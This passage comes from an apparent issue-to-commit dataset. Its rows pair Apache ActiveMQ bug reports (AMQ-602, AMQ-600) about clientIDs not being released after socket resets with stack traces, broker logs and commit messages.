        at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:54)
        at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:50)
        at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:365)
        at org.apache.activemq.broker.region.Topic.send(Topic.java:247)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:312)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)
        at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:336)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
ACTIVEMQ_HOME: /opt/activemq
Loading message broker from: xbean:activemq.xml
INFO  BrokerService                  - ActiveMQ 4.0-M4 JMS Message Broker (localhost) is starting
INFO  BrokerService                  - For help or more information please see: http://www.logicblaze.com
INFO  JDBCPersistenceAdapter         - Database driver recognized: [apache_derby_embedded_jdbc_driver]
INFO  JournalPersistenceAdapter      - Journal Recovery Started from: Active Journal: using 5 x 20.0 Megs at: ../activemq-data/journal
INFO  JournalPersistenceAdapter      - Journal Recovered: 0 message(s) in transactions recovered.
INFO  TransportServerThreadSupport   - Listening for connections at: tcp://s1:61616
INFO  TransportConnector             - Accepting connection on: tcp://s1:61616
WARN  MulticastDiscoveryAgent        - brokerName not set
INFO  TransportServerThreadSupport   - Listening for connections at: tcp://s1:61617?wireFormat=stomp
INFO  TransportConnector             - Accepting connection on: tcp://s1:61617?wireFormat=stomp
INFO  BrokerService                  - ActiveMQ JMS Message Broker (localhost) started
INFO  NetworkConnector               - Establishing network connection between vm://localhost?network=true and null at failover:tcp://s1:61616
INFO  VMTransportFactory             - binding to broker: localhost
INFO  TransportConnector             - Accepting connection on: vm://localhost
INFO  DemandForwardingBridge         - Starting a network connection between vm://localhost#0 and unconnected has been established.
INFO  ManagementContext              - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
INFO  DemandForwardingBridge         - Disconnecting loop back connection.
INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:153)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:66)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:75)
        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:478)
        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)
        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:153)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:66)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:75)
        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:478)
        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)
        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
INFO  VMTransportFactory             - Shutting down VM connectors for broker: localhost
INFO  VMTransportFactory             - Shutting down VM connectors for broker: localhost
INFO  Service                        - Async error occurred: java.io.EOFException: Cannot write to the stream any more it has already been closed
java.io.EOFException: Cannot write to the stream any more it has already been closed
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.checkClosed(TcpBufferedOutputStream.java:131)
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.write(TcpBufferedOutputStream.java:69)
        at java.io.DataOutputStream.writeInt(DataOutputStream.java:180)
        at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:169)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:117)
        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)
        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:212)
        at org.apache.activemq.broker.AbstractConnection.dispatchSync(AbstractConnection.java:517)
        at org.apache.activemq.broker.AbstractConnection.dispatchAsync(AbstractConnection.java:535)
        at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:142)
        at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:54)
        at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:50)
        at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:365)
        at org.apache.activemq.broker.region.Topic.send(Topic.java:247)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:312)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)
        at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:336)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)

Reverting to ""anonymous"" clients allows the client to create a new connection, but further persistant connections from the initial clientId cannot be made until the broker is restarted.

Please contact via email:  johng@amdswireless.com for additional information, if needed.

",0ff46b18790d8df6221346b0f433fea53fa5c69a,"[AMQ-6020] Adding the necessary import and removing the export packages
This closes #153
This closes #152"
12481590,AMQ-602,"During long-term operation, a remote, publish-only client with a TCP socket connection to the JMS broker will occasionally be disconnected at a low level (i.e. below the application level where JMS runs).  When this occurs, the JMS broker throws an exception indicating a broken socket, but does not release the clientID of the client to allow for reconnects.  The following stack traces should demonstrate this failure mode:

 INFO  Service                        - Async error occurred: java.net.SocketException: Connection reset
java.net.SocketException: Connection reset
        at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:96)
        at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:108)
        at java.io.DataOutputStream.flush(DataOutputStream.java:106)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:118)
        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)
        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:212)
        at org.apache.activemq.broker.AbstractConnection.dispatchSync(AbstractConnection.java:517)
        at org.apache.activemq.broker.AbstractConnection.dispatchAsync(AbstractConnection.java:535)
        at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:142)
        at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:54)
        at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:50)
        at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:365)
        at org.apache.activemq.broker.region.Topic.send(Topic.java:247)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:312)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)
        at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:336)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
ACTIVEMQ_HOME: /opt/activemq
Loading message broker from: xbean:activemq.xml
INFO  BrokerService                  - ActiveMQ 4.0-M4 JMS Message Broker (localhost) is starting
INFO  BrokerService                  - For help or more information please see: http://www.logicblaze.com
INFO  JDBCPersistenceAdapter         - Database driver recognized: [apache_derby_embedded_jdbc_driver]
INFO  JournalPersistenceAdapter      - Journal Recovery Started from: Active Journal: using 5 x 20.0 Megs at: ../activemq-data/journal
INFO  JournalPersistenceAdapter      - Journal Recovered: 0 message(s) in transactions recovered.
INFO  TransportServerThreadSupport   - Listening for connections at: tcp://s1:61616
INFO  TransportConnector             - Accepting connection on: tcp://s1:61616
WARN  MulticastDiscoveryAgent        - brokerName not set
INFO  TransportServerThreadSupport   - Listening for connections at: tcp://s1:61617?wireFormat=stomp
INFO  TransportConnector             - Accepting connection on: tcp://s1:61617?wireFormat=stomp
INFO  BrokerService                  - ActiveMQ JMS Message Broker (localhost) started
INFO  NetworkConnector               - Establishing network connection between vm://localhost?network=true and null at failover:tcp://s1:61616
INFO  VMTransportFactory             - binding to broker: localhost
INFO  TransportConnector             - Accepting connection on: vm://localhost
INFO  DemandForwardingBridge         - Starting a network connection between vm://localhost#0 and unconnected has been established.
INFO  ManagementContext              - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
INFO  DemandForwardingBridge         - Disconnecting loop back connection.
INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:153)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:66)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:75)
        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:478)
        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)
        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:153)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:66)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:75)
        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:478)
        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)
        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
INFO  VMTransportFactory             - Shutting down VM connectors for broker: localhost
INFO  VMTransportFactory             - Shutting down VM connectors for broker: localhost
INFO  Service                        - Async error occurred: java.io.EOFException: Cannot write to the stream any more it has already been closed
java.io.EOFException: Cannot write to the stream any more it has already been closed
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.checkClosed(TcpBufferedOutputStream.java:131)
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.write(TcpBufferedOutputStream.java:69)
        at java.io.DataOutputStream.writeInt(DataOutputStream.java:180)
        at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:169)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:117)
        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)
        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:212)
        at org.apache.activemq.broker.AbstractConnection.dispatchSync(AbstractConnection.java:517)
        at org.apache.activemq.broker.AbstractConnection.dispatchAsync(AbstractConnection.java:535)
        at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:142)
        at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:54)
        at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:50)
        at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:365)
        at org.apache.activemq.broker.region.Topic.send(Topic.java:247)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:312)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)
        at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:336)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)

Reverting to ""anonymous"" clients allows the client to create a new connection, but further persistant connections from the initial clientId cannot be made until the broker is restarted.

Please contact via email:  johng@amdswireless.com for additional information, if needed.

",95f58fa7c4e26b5b2d73a80bd8e1cb2bee8ebf47,"https://issues.apache.org/jira/browse/AMQ-6027

Adding back in test case now that AMQ-5898 is resolved"
12481512,AMQ-600,"During long-term operation, a remote, publish-only client with a TCP socket connection to the JMS broker will occasionally be disconnected at a low level (i.e. below the application level where JMS runs).  When this occurs, the JMS broker throws an exception indicating a broken socket, but does not release the clientID of the client to allow for reconnects.  The following stack traces should demonstrate this failure mode:

 INFO  Service                        - Async error occurred: java.net.SocketException: Connection reset
java.net.SocketException: Connection reset
        at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:96)
        at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:108)
        at java.io.DataOutputStream.flush(DataOutputStream.java:106)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:118)
        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)
        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:212)
        at org.apache.activemq.broker.AbstractConnection.dispatchSync(AbstractConnection.java:517)
        at org.apache.activemq.broker.AbstractConnection.dispatchAsync(AbstractConnection.java:535)
        at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:142)
        at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:54)
        at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:50)
        at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:365)
        at org.apache.activemq.broker.region.Topic.send(Topic.java:247)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:312)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)
        at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:336)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
ACTIVEMQ_HOME: /opt/activemq
Loading message broker from: xbean:activemq.xml
INFO  BrokerService                  - ActiveMQ 4.0-M4 JMS Message Broker (localhost) is starting
INFO  BrokerService                  - For help or more information please see: http://www.logicblaze.com
INFO  JDBCPersistenceAdapter         - Database driver recognized: [apache_derby_embedded_jdbc_driver]
INFO  JournalPersistenceAdapter      - Journal Recovery Started from: Active Journal: using 5 x 20.0 Megs at: ../activemq-data/journal
INFO  JournalPersistenceAdapter      - Journal Recovered: 0 message(s) in transactions recovered.
INFO  TransportServerThreadSupport   - Listening for connections at: tcp://s1:61616
INFO  TransportConnector             - Accepting connection on: tcp://s1:61616
WARN  MulticastDiscoveryAgent        - brokerName not set
INFO  TransportServerThreadSupport   - Listening for connections at: tcp://s1:61617?wireFormat=stomp
INFO  TransportConnector             - Accepting connection on: tcp://s1:61617?wireFormat=stomp
INFO  BrokerService                  - ActiveMQ JMS Message Broker (localhost) started
INFO  NetworkConnector               - Establishing network connection between vm://localhost?network=true and null at failover:tcp://s1:61616
INFO  VMTransportFactory             - binding to broker: localhost
INFO  TransportConnector             - Accepting connection on: vm://localhost
INFO  DemandForwardingBridge         - Starting a network connection between vm://localhost#0 and unconnected has been established.
INFO  ManagementContext              - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi
INFO  DemandForwardingBridge         - Disconnecting loop back connection.
INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:153)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:66)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:75)
        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:478)
        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)
        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:153)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:66)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)
        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:75)
        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:478)
        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)
        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)
INFO  VMTransportFactory             - Shutting down VM connectors for broker: localhost
INFO  VMTransportFactory             - Shutting down VM connectors for broker: localhost
INFO  Service                        - Async error occurred: java.io.EOFException: Cannot write to the stream any more it has already been closed
java.io.EOFException: Cannot write to the stream any more it has already been closed
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.checkClosed(TcpBufferedOutputStream.java:131)
        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.write(TcpBufferedOutputStream.java:69)
        at java.io.DataOutputStream.writeInt(DataOutputStream.java:180)
        at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:169)
        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:117)
        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)
        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)
        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:212)
        at org.apache.activemq.broker.AbstractConnection.dispatchSync(AbstractConnection.java:517)
        at org.apache.activemq.broker.AbstractConnection.dispatchAsync(AbstractConnection.java:535)
        at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:142)
        at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:54)
        at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:50)
        at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:365)
        at org.apache.activemq.broker.region.Topic.send(Topic.java:247)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:312)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)
        at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:336)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
        at java.lang.Thread.run(Thread.java:595)

